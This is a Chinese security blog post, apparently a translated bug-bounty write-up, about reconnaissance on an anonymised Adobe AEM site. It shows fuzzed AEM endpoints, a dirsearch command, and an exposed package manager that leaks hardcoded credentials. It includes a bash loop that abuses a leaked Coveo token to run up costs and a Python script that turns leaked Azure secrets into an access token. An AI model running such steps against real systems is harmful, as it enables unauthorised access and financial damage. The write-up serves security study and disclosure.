#  通过高效的侦察发现关键漏洞接管整个IT基础设施   
白帽子左一  白帽子左一   2025-01-13 04:01  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
**来****Track安全社区投稿~**  
  
**赢千元稿费！还有保底奖励~（https://bbs.zkaq.cn）**  
  
**在这篇文章中，** 我将深入探讨我是如何通过详细分析和利用暴露的端点、硬编码的凭据以及配置错误的访问控制，成功获取目标组织关键IT基础设施和云服务访问权限的全过程。  
  
我们先提到目标网站的名称   
**https://*sub.domain*.com**[1]  
  
在我的**主动侦察**中，我发现目标**使用 AEM 作为内容管理系统 (CMS)**，并且**由 Java 驱动**。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xicsFElcFL2wUePVLdZqdXXNFJOZ7FRnJVac2LkQOR88JsZrSP8nY4Tw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
首先，我**收集了用于 AEM CMS 和 JSP 的字典**以及**端点**。  
  
然后，我进行了**模糊测试 (fuzzing)**，并发现了一些有用的端点。  
```
/crx/packmgr/index.jsp
/etc.feed.xml
/crx/bin.ext.json
/crx/.ext.infinity.json
```  
  
当我发现 **/etc.feed.xml** 时，找到了相关内容。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0x9AfJlD7BrF9e5hX5ZtRsva1pbUPKgHAGs8ywP6vsBbAjcibjX7C9d9w/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
然后引起我注意的是这个 URL：  
  
**https://sub.domain.com/etc/packages.feed.xml**[2] **发现了许多**包，这些包的格式如下：  
```
https://sub.domain.com/etc/packages/{groupOfPackage}/{nameOfPackage}.zip
```  
  
访问任何符合该格式的 URL **都可以下载任意包**， 但在深入研究这些包后，**没有发现任何有趣的内容**。  
  
然后再次回到使用 **JSP 字典**对有趣的端点进行模糊测试。  
```
dirsearch -u https://sub.domain.com/crx/packmgr/ --random-agent -i 200 -w jsp.txt
```  
  
发现了这个端点：https://sub.domain.com**/crx/packmgr/service.jsp**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xeqbtpDJXnyF5qVy1edhkYl1ZbEaMam1Mnl3g0oTUHeHib76T8E90z8Q/640?wx_fmt=jpeg&from=appmsg "null")  
  
img  
  
我请我的朋友协助执行操作。然而，我们发现用户是 **anonymous**（匿名用户），除了通过添加 cmd 参数列出所有包之外，无法执行任何其他操作。  
```
https://sub.domain.com/crx/packmgr/service.jsp?cmd=ls
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0x9ZgD2fX5mPEp2STdW8iasaWhapb4YrQO1kPgk8oujiaq7vjF4ftZpAkQ/640?wx_fmt=png&from=appmsg "")  
  
img  
  
**检索到约 1173 个包和约 100 个配置包。**  
  
我**想起**可以使用以下格式下载这些包：  
```
https://sub.domain.com/etc/packages/{groupOfPackage}/{nameOfPackage}.zip
```  
  
于是，我编写了一个简单的脚本来下载所有包。然后，我深入研究了**配置包**，**发现了大量硬编码的凭据**。  
  
**1- 泄露了所有作者的邮箱**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xejQD8jqPrUMgVQRYuyw6oxPlF5k6crciaibGKJQE8KQT5d2heMqbLZZw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
**2- Covo 服务配置（付费服务）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xmbJ79ZcvSO2stR7WCkOQ4r9hbxNGCGMCBZLe0BnMS5CQWwtxjuSic3A/640?wx_fmt=png&from=appmsg "null")  
  
img  
```
for i in {1..10000}; do
  curl -X GET "https://platform.cloud.coveo.com/rest/search/v2?organizationId={clientId}&q=*" \
    -H "Authorization: Bearer {accesstoken}" \
    -H "Content-Type: application/json";
done
```  
  
**我可以通过使用简单的 bash 脚本让组织损失大量资金，因为这个访问令牌是有效的。**  
  
**3- 有效的凭据用于** API 管理并提供对托管在 https://**sub3****.domain.com** 上的仓库的访问。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0x2d2DCtiaORgibEXLQRBib9zokic67HOUG14UKOlE6KjJMLPatlWma642tg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xRzQVTSp3wHjAIic9pibHvibBRjGRYKibsy7r6ibVPcryxgPyPLicMhrtibfTw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
4- **ARIA-azure-凭据**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xiaKpCKcwzFmxTw5eoa4dEhyNk8F27ib3uNp4SkLia5NCOFQfFs91vbjhg/640?wx_fmt=png&from=appmsg "null")  
  
img  
```
import requests

# Define the authentication parameters
tenant_id = "{tenant_id}"
client_id = "{client_id}"
client_secret = "{client_secret}"
scope = "https://sub.cloudapp.domain.com/.default"

# URL to get the OAuth token
token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"

# Define the request payload
payload = {
    "grant_type": "client_credentials",
    "client_id": client_id,
    "client_secret": client_secret,
    "scope": scope
}

# Make a POST request to get the token
response = requests.post(token_url, data=payload)

# Check if the request was successful
if response.status_code == 200:
    # Parse the JSON response
    token_response = response.json()
    access_token = token_response.get("access_token")
    print("Access Token:", access_token)
else:
    # If the request failed, print the error
    print("Failed to get the access token:", response.status_code, response.text)
```  
  
这个 Python 脚本使用凭据检索 OAuth 访问令牌，以便与 **api** 交互，访问 https://sub.cloudapp.domain.com/  
  
5-   
**ServiceNow**[3]（IT 服务管理）  
  
通过使用这些**泄露的凭据**，我拥有所有**权限（创建、删除、编辑）**。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xxmhIOIlCplIEJ0MxrA0PwyhLW1sZcyfvsNynt8lQddeHr1s9ia7fHbA/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xkpZ2KYG387Hcia89MeEFHibTmmUaxXhamuBArqR70NG3mra6M4zNic4Dg/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0xrzHFbkWUQFLLaEXKNibx3gbMAEG7NZnicKiah7Zrx9xar8ImhzLHCg8xw/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSHAlJJM5Qhs6swrwrHGPC0x7AyxxWnicXVgXX6gmJianJu3FiandM2gl6HhmZF7HVicsiaiaxtJwY0CxUpQ/640?wx_fmt=png&from=appmsg "null")  
  
img  
  
**声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学********习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。所有渗透都需获取授权！**  
  
**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk安全知识星球,我们一起进步一起学习。星球不定期会分享一些前沿漏洞，每周安全面试经验、SRC实战纪实等文章分享，微信识别二维码，即可加入。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFIJlRFYoItlJDrScxuTPmfnqibC1ApJ2OKh5sF41qicCo5AvQ4icuG8kbqQxZ5HVypvJ8jZDzsmD37Q/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
